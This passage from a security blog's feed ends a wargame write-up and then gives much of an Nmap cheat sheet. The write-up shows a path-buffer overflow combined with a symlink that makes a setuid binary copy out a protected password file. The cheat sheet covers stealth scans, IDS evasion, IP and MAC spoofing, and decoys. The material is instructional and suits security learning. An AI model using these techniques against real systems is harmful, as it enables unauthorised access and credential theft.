&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/tmp/&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, let's move on and create a directory. But because its name will only fulfill the buffer, we have to add another one, which will overwrite the buffer. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia3@melinda:/tmp$ mkdir AAAAAAAAAAAAAAAAAAAAAAAAAAW     
narnia3@melinda:/tmp$ cd AAAAAAAAAAAAAAAAAAAAAAAAAAW
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW$ mkdir tmp
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW$ cd tmp&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can create a link using &lt;b&gt;ln&lt;/b&gt; command on w3ndige file, to the password file. This means that when we cat the created file, it will actually cat the content of the password file “/etc/narnia_pass/narnia4”. We can also see, if it works, using &lt;b&gt;ls&lt;/b&gt; command.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ ln -s /etc/narnia_pass/narnia4 ./w3ndige
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ ls -lh
total 0
lrwxrwxrwx 1 narnia3 narnia3 24 Feb 28 20:18 w3ndige -&amp;gt; /etc/narnia_pass/narnia4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we have to pass this directory, as an argument, to the binary. Let's pray it works. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ /narnia/narnia3 /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp/w3ndige
copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp/w3ndige to a safer place... (/tmp/w3ndige)
narnia3@melinda:/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAW/tmp$ cat /tmp/w3ndige
**********&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And it worked, now we have the password! &lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Once gain thanks &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;! I'm definitely looking forward to new challenges from &lt;b&gt;Narnia&lt;/b&gt;, as I'm getting more and more interested in reverse engineering. &lt;/p&gt;

&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Nmap</title><link href="http://localhost:4000/nmap-cheat-sheet/" rel="alternate" type="text/html" title="Nmap" /><published>2017-02-25T00:00:00+00:00</published><updated>2017-02-25T00:00:00+00:00</updated><id>http://localhost:4000/nmap-cheat-sheet</id><content type="html" xml:base="http://localhost:4000/nmap-cheat-sheet/">&lt;h1&gt;What is Nmap?&lt;/h1&gt;

&lt;p&gt;&lt;b&gt;Nmap&lt;/b&gt;, short for network mapper, is an open source security tool for network exploration, security scanning and auditing. It was originally written by Gordon Lyon AKA Fyodor, firstly published in September 1997 in a &lt;a href=&quot;http://phrack.org/issues/51/11.html&quot;&gt;Phrack Magazine&lt;/a&gt;, with included source code. &lt;/p&gt;

&lt;p&gt;It uses raw IP packets in novel ways to determine what hosts are available on the network, what services those hosts are running, OS detection, what type of packet filters/firewalls are in use, and many others. &lt;/p&gt;

&lt;p&gt;Nmap has even made appearance in a few movies, including &lt;b&gt;The Matrix Reloaded&lt;/b&gt;, where Trinity needing to hack the city power grid, she whips out Nmap, uses it to find a vulnerable SSH server, and then proceeds to exploit it using the SSH1 CRC32 exploit from 2001. Of course there are more films, such as &lt;b&gt;The Bourne Ultimatum&lt;/b&gt;, &lt;b&gt;Girl With the Dragon Tattoo&lt;/b&gt;, &lt;b&gt;Live Free or Die Hard&lt;/b&gt;, or even computer game called &lt;b&gt;Hacknet&lt;/b&gt;. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/nmap/nmap-matrix.jpg&quot; alt=&quot;Matrix-Reloaded&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;h1&gt;Table of Contents&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#fast-start&quot;&gt;Fast Start&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#target-selection&quot;&gt;Target Selection&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#port-selection&quot;&gt;Port Selection&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#probing-options&quot;&gt;Probing Options&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#timing-options&quot;&gt;Timing Options&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#scan-techniques&quot;&gt;Scan Techniques&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#service-version-detection&quot;&gt;Service Version Detection&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#os-detection&quot;&gt;OS Detection&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#firewall-evasion&quot;&gt;Firewalls IDS Evasion and Spoofing&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#scripting&quot;&gt;Scripting&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#output-options&quot;&gt;Output Options&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
  &lt;li&gt;&lt;h3&gt;&lt;a href=&quot;#miscellaneous&quot;&gt;Miscellaneous&lt;/a&gt;&lt;/h3&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;fast-start&quot;&gt;Fast Start&lt;/h1&gt;

&lt;p&gt;Firstly I'll discuss a few commands, that are essential for me.  &lt;/p&gt;

&lt;p&gt;&lt;b&gt;1. nmap -sP 192.168.0.1/24&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;This command, also known as &quot;ping scan&quot;, tells Nmap to send an &lt;b&gt;ICMP echo&lt;/b&gt; request, &lt;b&gt;TCP SYN&lt;/b&gt; to port 443, &lt;b&gt;TCP ACK&lt;/b&gt; to port 80 and &lt;b&gt;ICMP timestamp&lt;/b&gt; request to all hosts in the specified subnet. Then, Nmap will return a list of IP's that have responded. &lt;/p&gt;

&lt;p&gt;This command &lt;b&gt;does not require root&lt;/b&gt;, however while used with root account, Nmap will send additional &lt;b&gt;ARP&lt;/b&gt; requests. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;2. nmap 192.168.0.1/24&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Default scan, that will look for open ports. Nmap will try and attempt a &lt;b&gt;TCP SYN&lt;/b&gt; connection to 1000 most common ports, as well as an &lt;b&gt;ICMP echo&lt;/b&gt; request to determine if a host is up. In addition, &lt;b&gt;DNS lookup&lt;/b&gt; will be performed, possibly giving us some useful information. &lt;b&gt;No root required&lt;/b&gt;.  &lt;/p&gt;

&lt;p&gt;&lt;b&gt;3. nmap -T4 -F 192.168.0.100&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Fast scan, that will look at 100 most common ports. &lt;b&gt;No root required&lt;/b&gt;.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;4. nmap -sS -sU -Pn -p- 192.168.0.100&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;TCP SYN&lt;/b&gt; and &lt;b&gt;UDP&lt;/b&gt; scan is rather unobtrusive and stealthy. &lt;b&gt;-Pn&lt;/b&gt; flag will also skip the ping scan, assuming that all hosts are up (very useful when there is a firewall preventing ICMP replies). In addition &lt;b&gt;-p-&lt;/b&gt; will scan all 65535 ports. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;5. nmap -v -sS -A -T4 192.168.0.100&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;This command will run &lt;b&gt;TCP SYN&lt;/b&gt; scan, with &lt;b&gt;OS and version detection&lt;/b&gt; + &lt;b&gt;traceroute&lt;/b&gt;, &lt;b&gt;T4&lt;/b&gt; timing and, in addition, will print &lt;b&gt;verbose output&lt;/b&gt;. &lt;/p&gt;

&lt;h1 id=&quot;target-selection&quot;&gt;Target Selection&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;192.168.0.1&lt;/th&gt;
      &lt;th&gt;Scan a single IPV4&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;AABB:CCDD::FF%eth0&lt;/th&gt;
      &lt;th&gt;Scan a single IPV6&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;192.168.0.1-15&lt;/th&gt;
      &lt;th&gt;Scan a range of IP's&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;192.168.0.1/24&lt;/th&gt;
      &lt;th&gt;Scan a subnet&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;www.hostname.com&lt;/th&gt;
      &lt;th&gt;Scan a hostname&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-iL&lt;/span&gt; list.txt&lt;/th&gt;
      &lt;th&gt;Scan targets from text file&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;port-selection&quot;&gt;Port Selection&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;text-success&quot;&gt;22&lt;/span&gt; 192.168.0.1&lt;/th&gt;
      &lt;th&gt;Scan a single port&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;text-success&quot;&gt;1-100&lt;/span&gt; 192.168.0.1&lt;/th&gt;
      &lt;th&gt;Scan a range of ports&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-F&lt;/span&gt; 192.168.0.1&lt;/th&gt;
      &lt;th&gt;Scan 100 most common ports&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-p-&lt;/span&gt; 192.168.0.1&lt;/th&gt;
      &lt;th&gt;Scan all 65535 ports&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;text-success&quot;&gt;U:PORT&lt;/span&gt; 192.168.0.1&lt;/th&gt;
      &lt;th&gt;Scan UDP ports, ex U:53,U:110&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-r&lt;/span&gt; 192.168.0.1&lt;/th&gt;
      &lt;th&gt;Do not randomize ports&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;probing-options&quot;&gt;Probing Options&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-pN&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Assume all hosts are up&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-PB&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Default probe&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-PS/PA/PU/PY&lt;/span&gt;[portlist]&lt;/th&gt;
      &lt;th&gt;TCP SYN/ACK, UDP or SCTP ports probing&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-PE/PP/PM&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;ICMP Echo, Timestamp, and Netmask probing&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;timing-options&quot;&gt;Timing Options&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-T0&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;&lt;i&gt;Paranoid&lt;/i&gt; Very slow, used for IDS evasion&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-T1&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;&lt;i&gt;Sneaky&lt;/i&gt; Quite slow, used for IDS evasion&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-T2&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;&lt;i&gt;Polite&lt;/i&gt; Runs around 10 times slower than normal, used to save bandwidth&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-T3&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;&lt;i&gt;Normal&lt;/i&gt; A dynamic timing model based on target responsiveness&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-T4&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;&lt;i&gt;Aggresive&lt;/i&gt; Assumes a fast and reliable network&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-T5&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;&lt;i&gt;Insane&lt;/i&gt; Fastest option, will likely overwhelm targets or miss open ports&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--scan-delay&lt;/span&gt;&lt;br /&gt;&lt;span class=&quot;text-danger&quot;&gt;--max-scan-delay&lt;/span&gt; TIME&lt;/th&gt;
      &lt;th&gt;Adjust delay between probes&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--host-timeout&lt;/span&gt; TIME&lt;/th&gt;
      &lt;th&gt;Give up on target after specified time&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--min-hostgroup&lt;/span&gt;&lt;br /&gt;&lt;span class=&quot;text-danger&quot;&gt;--max-hostgroup&lt;/span&gt; TIME&lt;/th&gt;
      &lt;th&gt;Parallel host scan group sizes&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--min-parallelism&lt;/span&gt;&lt;br /&gt;&lt;span class=&quot;text-danger&quot;&gt;--max-parallelism &lt;/span&gt; TIME&lt;/th&gt;
      &lt;th&gt;Probe parallelization&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--min-rtt-timeout&lt;/span&gt;&lt;br /&gt;&lt;span class=&quot;text-danger&quot;&gt;--max-rtt-timeout &lt;/span&gt;&lt;br /&gt;&lt;span class=&quot;text-danger&quot;&gt;--initial-rtt-timeout &lt;/span&gt; TIME&lt;/th&gt;
      &lt;th&gt;Specifies probe round trip time&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--max-retries&lt;/span&gt; TRIES&lt;/th&gt;
      &lt;th&gt;Caps number of port scan probe retransmissions&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--min-rate&lt;/span&gt; NUMBER&lt;/th&gt;
      &lt;th&gt;Send packets no slower than NUMBER per second&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--max-rate&lt;/span&gt; NUMBER&lt;/th&gt;
      &lt;th&gt;Send packets no faster than NUMBER per second&lt;/th&gt;
    &lt;/tr&gt;

  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;scan-techniques&quot;&gt;Scan Techniques&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sS&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;TCP SYN Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sN&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;TCP NULL Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sU&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;UDP Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sF&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Fin Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sF&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;ACK Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sW&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Windows Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sT&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Connect Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sX&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Xmas Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sM&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Maimon Scan&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;service-version-detection&quot;&gt;Service Version Detection&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sV&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Version Scan&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--version-intensity &quot;intensity&quot;&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Set intensity from 0 (light) to 9 (try all probes)&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--version-light&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Intensity 2&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--version-all&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Intensity 9&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--version-trace&lt;/span&gt; &lt;/th&gt;
      &lt;th&gt;Show detailed version scan activity&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;os-detection&quot;&gt;OS Detection&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-O&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Enable OS Detection&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--osscan-limit&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Limit OS detection to only promising targets&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--osscan-guess&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Guess OS more aggressively&lt;/th&gt;
    &lt;/tr&gt;

  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;firewall-evasion&quot;&gt;Firewalls IDS Evasion and Spoofing&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-S&lt;/span&gt; IP&lt;/th&gt;
      &lt;th&gt;Spoof IP address&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--spoof-mac&lt;/span&gt; MAC&lt;/th&gt;
      &lt;th&gt;Spoof MAC address&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--data-length&lt;/span&gt; NUM&lt;/th&gt;
      &lt;th&gt;Append random data to packets&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-g&lt;/span&gt; PORT&lt;br /&gt;&lt;span class=&quot;text-danger&quot;&gt;--source-port&lt;/span&gt; PORT&lt;/th&gt;
      &lt;th&gt;Use given port number&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-D &lt;/span&gt; decoy1,decoy2,ME&lt;/th&gt;
      &lt;th&gt;Cloak a scan with decoys&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--badsum &lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Send packets with a fake TCP/UDP/SCTP checksum&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--ttl &lt;/span&gt;VALUE&lt;/th&gt;
      &lt;th&gt;Set IP time to live field&lt;/th&gt;
    &lt;/tr&gt;

  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;scripting&quot;&gt;Nmap Scripting&lt;/h1&gt;

&lt;p&gt;Firstly, let's discuss different categories of scripting in Nmap. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;Auth&lt;/b&gt; - utilize credentials or bypass authentication on target
hosts.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;broadcast&lt;/b&gt; - discover hosts not includedon command line by broadcasting on local network. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;brute&lt;/b&gt; - attempt to guess passwords on target systems, for avariety of protocols, including http, SNMP, IAX, MySQL, VNC,etc.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;default&lt;/b&gt; - scripts run automatically when -sC or-A are used.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;discovery&lt;/b&gt; - try to learn more information about target hosts through public sources of information, SNMP, directory services, and more. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;dos&lt;/b&gt; - may cause denial of service conditions in target hosts. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;exploit&lt;/b&gt; - attempt to exploit target systems. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;external&lt;/b&gt; - interact with third partysystems not included intarget list. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;fuzzer&lt;/b&gt; - send unexpected input in network protocol fields.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;intrusive&lt;/b&gt; - may crash target, consume excessive resources, or otherwise impact target machines in a malicious fashion. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;malware&lt;/b&gt; - look for signs of malware infection on the target hosts. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;safe&lt;/b&gt; - designed not to impact target in a negative fashion. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;version&lt;/b&gt; - measure the version of software or protocol spoken by target hosts. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;vul&lt;/b&gt; - measure whether target systems have a known vulnerability &lt;/p&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-sC&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Run default scripts&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--script&lt;/span&gt;=&quot;category&quot;&lt;/th&gt;
      &lt;th&gt;Enter here script category or script-file&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--script-updatedb&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Update script database&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
